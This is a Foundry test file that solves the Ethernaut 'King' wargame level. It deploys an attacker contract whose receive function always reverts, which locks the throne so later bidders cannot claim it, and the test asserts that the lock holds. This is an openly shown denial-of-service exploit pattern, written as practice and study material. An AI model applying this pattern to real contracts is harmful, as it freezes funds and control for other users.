// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/9_King/King.sol";

contract KingTest is Test {
    King public kingVictim;
    address public ownerKing;
    address public hackUser;
    address public hackUser2;

    function setUp() public {
        ownerKing = vm.addr(1);
        hackUser = vm.addr(2);
        hackUser2 = vm.addr(3);

        vm.startPrank(ownerKing);

        kingVictim = new King();
        //enviar 1 ether desde el owner al contrato
        vm.deal(ownerKing, 1 ether);
        (bool success, ) = address(kingVictim).call{value: 1 ether}("");
        vm.stopPrank();


    }

    function test_getInitValues() public {
        assertEq(kingVictim.owner(), ownerKing);
        assertEq(kingVictim.prize(), 1 ether);
        assertEq(kingVictim._king(), ownerKing);
    }

    function test_hackKing() public {
        vm.startPrank(hackUser);
        KingHack addressContract = new KingHack(address(kingVictim));
        vm.deal(hackUser, 1.1 ether);
        addressContract.attack{value: 1.1 ether}();
        vm.stopPrank();
        assertEq(kingVictim._king(), address(addressContract));

        vm.startPrank(hackUser2);
        vm.deal(hackUser2, 1.2 ether);
        (bool success, ) = address(kingVictim).call{value: 1.2 ether}("");
        vm.stopPrank();

        assertEq(kingVictim._king(), address(addressContract));


    }
}

contract KingHack {
    King public challenge;

    constructor(address challengeAddress) {
        challenge = King(payable(challengeAddress));
    }

    function attack() external payable {
        (bool success, ) = payable(address(challenge)).call{value: msg.value}(
            ""
        );
        require(success, "Call failed");
    }

    receive() external payable {
        require(false, "Can's steal my throne bro!");
    }
}
